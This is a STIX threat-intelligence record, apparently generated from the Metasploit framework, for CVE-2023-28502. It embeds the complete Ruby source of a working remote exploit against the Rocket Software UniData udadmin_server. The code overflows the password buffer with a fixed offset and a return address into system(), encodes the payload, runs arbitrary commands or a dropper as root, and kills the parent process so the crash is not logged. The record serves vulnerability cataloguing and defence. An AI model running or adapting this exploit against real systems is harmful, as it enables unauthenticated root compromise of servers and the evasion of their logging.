{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--84a940d6-58b0-4774-9d82-d88b40fbeb1f",
    "created": "2024-08-14T16:57:55.95512Z",
    "modified": "2024-08-14T16:57:55.955124Z",
    "name": "Rocket Software Unidata udadmin_server Stack Buffer Overflow in Password",
    "description": " This modlue exploits an authentication bypass vulnerability in the Linux version of udadmin_server, which is an RPC service that comes with the Rocket Software UniData server, which runs as root.  This vulnerability affects UniData versions 8.2.4 build 3003 and earlier (for Linux), but this module specifically targets UniData version 8.2.4 build 3001. Other versions will crash the forked process, but will not otherwise affect the RPC server.  The username and password fields are copied to a stack-based buffer using a function that's equivalent to strcpy() (ie, has no bounds checking). Additionally, the password field is encoded in such a way that we can include NUL bytes.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/misc/unidata_udadmin_password_stack_overflow.rb",
            "external_id": "unidata_udadmin_password_stack_overflow.rb"
        },
        {
            "source_name": "reference",
            "url": "https://www.rapid7.com/blog/post/2023/03/29/multiple-vulnerabilities-in-rocket-software-unirpc-server-fixed"
        },
        {
            "source_name": "CVE",
            "external_id": "2023-28502"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GoodRanking\n\n  include Msf::Exploit::Remote::Tcp\n  include Msf::Exploit::CmdStager\n  include Msf::Exploit::Remote::Unirpc\n  prepend Msf::Exploit::Remote::AutoCheck\n\n  OFFSETS = {\n    '8.2.4' => {\n      # The amount of padding required to overwrite the return addr\n      'offset' => 0x2b8,\n\n      # This returns to \"mov rdi, rsp / call system\", which means the\n      # remainder of what's on the stack will be passed to system()\n      'return_address' => 0x412e25\n    }\n  }\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Rocket Software Unidata udadmin_server Stack Buffer Overflow in Password',\n        'Description' => %q{\n          This modlue exploits an authentication bypass vulnerability in the\n          Linux version of udadmin_server, which is an RPC service that comes\n          with the Rocket Software UniData server, which runs as root.\n\n          This vulnerability affects UniData versions 8.2.4 build 3003 and\n          earlier (for Linux), but this module specifically targets UniData\n          version 8.2.4 build 3001. Other versions will crash the forked\n          process, but will not otherwise affect the RPC server.\n\n          The username and password fields are copied to a stack-based buffer\n          using a function that's equivalent to strcpy() (ie, has no bounds\n          checking). Additionally, the password field is encoded in such a way\n          that we can include NUL bytes.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'Ron Bowes', # Discovery, PoC, module\n        ],\n        'References' => [\n          [ 'URL', 'https://www.rapid7.com/blog/post/2023/03/29/multiple-vulnerabilities-in-rocket-software-unirpc-server-fixed' ],\n          [ 'CVE', '2023-28502' ],\n        ],\n        'Platform' => ['linux', 'unix'],\n        'Arch' => [ARCH_X86, ARCH_X64, ARCH_CMD],\n        'DefaultOptions' => {\n          'RPORT' => 31438,\n          'PrependFork' => true\n        },\n        'Targets' => [\n          [\n            'Unix Command',\n            {\n              'Platform' => 'unix',\n              'Arch' => ARCH_CMD,\n              'Type' => :unix_cmd\n            }\n          ],\n          [\n            'Linux Dropper',\n            {\n              # Used for auto-selection\n              'Version' => '8.2.4',\n\n              'Platform' => 'linux',\n              'Arch' => [ARCH_X86, ARCH_X64],\n              'Type' => :linux_dropper\n            }\n          ]\n        ],\n        'DefaultTarget' => 0,\n        'Privileged' => true,\n        'DisclosureDate' => '2023-03-30',\n        'Notes' => {\n          'SideEffects' => [],\n          'Reliability' => [REPEATABLE_SESSION],\n          'Stability' => [CRASH_SERVICE_RESTARTS] # The forked process can crash\n        }\n      )\n    )\n\n    register_options(\n      [\n        OptBool.new('EXIT_CLEANLY', [ true, 'If set, tries to kill the parent process with SIGTERM before it crashes', true]),\n        OptEnum.new('UNIDATA_VERSION', [true, 'The version of UniData target. Automatic detection is the default.', 'auto', ['auto', '8.2.4'] ]),\n      ]\n    )\n\n    register_advanced_options(\n      [\n        OptString.new('UNIRPC_ENDPOINT', [ true, 'The UniRPC service to request', 'udadmin']),\n      ]\n    )\n  end\n\n  # We can detect UniRPC by performing a version check, but the version number\n  # didn't increment in the patch (only the build number did, which AFAICT we\n  # can't access), so just do a sanity check\n  def check\n    @version = unirpc_get_version\n    vprint_status(\"Detected UniRPC version #{@version} is running\")\n\n    Exploit::CheckCode::Detected\n  rescue UniRPCCommunicationError => e\n    return CheckCode::Safe(\"Could not communicate with the UniRPC server: #{e}\")\n  rescue UniRPCUnexpectedResponseError => e\n    return CheckCode::Safe(\"UniRPC server returned something unexpected: #{e}\")\n  end\n\n  def execute_command(cmd, _opts = {})\n    # Connect to the service and authenticate before running the command stager\n    connect\n\n    # Connect to the RPC service (probably \"udadmin\")\n    vprint_status(\"Connecting to UniRPC endpoint #{datastore['UNIRPC_ENDPOINT']}\")\n    sock.put(build_unirpc_message(args: [\n      # Service name\n      { type: :string, value: datastore['UNIRPC_ENDPOINT'] },\n\n      # \"Secure\" flag - this must be non-zero if the server is started in\n      # \"secure\" mode (-s)\n      { type: :integer, value: 1 },\n    ]))\n    recv_unirpc_message(sock, first_result_is_status: true)\n\n    # Pick a random username\n    username = rand_text_alpha(6..20)\n\n    # Start the password with random junk that writes to the stack\n    password = rand_text_alpha(@offsets['offset'])\n\n    # Append the return address\n    password += [@offsets['return_address']].pack('Q')\n\n    # Attempt to cleanly kill the parent process if we can (otherwise it\n    # crashes)\n    #\n    # Because of how the payload goes onto the stack immediately after the\n    # return address, we can't return into an `exit` call - all the parent\n    # process can do is crash (which is logged).\n    #\n    # We CAN, however, prepend a command to cleanly kill the parent PID, making\n    # it look like a standard exit (not logged).\n    if datastore['EXIT_CLEANLY']\n      password += 'kill -TERM $PPID & '\n    end\n\n    # End with the command, which will be passed to system()\n    password += cmd\n\n    # Check if the payload includes the `\\xff` character, which will terminate\n    # the string and break the module. This shouldn't ever appear in the actual\n    # payload, which is base64-encoded, but this will catch a future return\n    # address that would break the payload\n    if password.include?(\"\\xff\")\n      fail_with(Failure::BadConfig, 'Payload contains a 0xFF character, which will fail')\n    end\n\n    vprint_status(\"Authenticating to RPC service as #{username} with a stack-overflowing password\")\n    sock.put(build_unirpc_message(args: [\n      # Message type\n      { type: :integer, value: UNIRPC_MESSAGE_LOGIN },\n\n      # Username\n      { type: :string, value: username },\n\n      # Password (encoded by making each byte negative)\n      { type: :string, value: password.bytes.map { |b| (0x0FF & (~b)).chr }.join },\n    ]))\n\n    print_status('Payload sent')\n  end\n\n  def exploit\n    if datastore['UNIDATA_VERSION'] == 'auto'\n      if @version.nil?\n        vprint_status('Requesting the version number for automatic targeting...')\n        @version = unirpc_get_version\n      else\n        vprint_status(\"Using the version number from earlier for targeting: #{@version}\")\n      end\n    else\n      @version = datastore['UNIDATA_VERSION']\n      vprint_status(\"Using the version number from UNIDATA_VERSION for targeting: #{@version}\")\n    end\n\n    @offsets = OFFSETS[@version]\n    if @offsets.nil?\n      fail_with(Failure::NoTarget, \"No matching target for version #{@version}\")\n    end\n\n    # Run the command(s)\n    case target['Type']\n    when :unix_cmd\n      execute_command(payload.encoded)\n    when :linux_dropper\n      execute_cmdstager\n    end\n  rescue UniRPCCommunicationError => e\n    fail_with(Failure::Unreachable, \"Could not communicate with the UniRPC server: #{e}\")\n  rescue UniRPCUnexpectedResponseError => e\n    fail_with(Failure::UnexpectedReply, \"UniRPC server returned something unexpected: #{e}\")\n  end\nend\n",
    "x_mitre_disclosure_date": "2023-03-30",
    "x_mitre_platforms": [
        "linux'"
    ]
}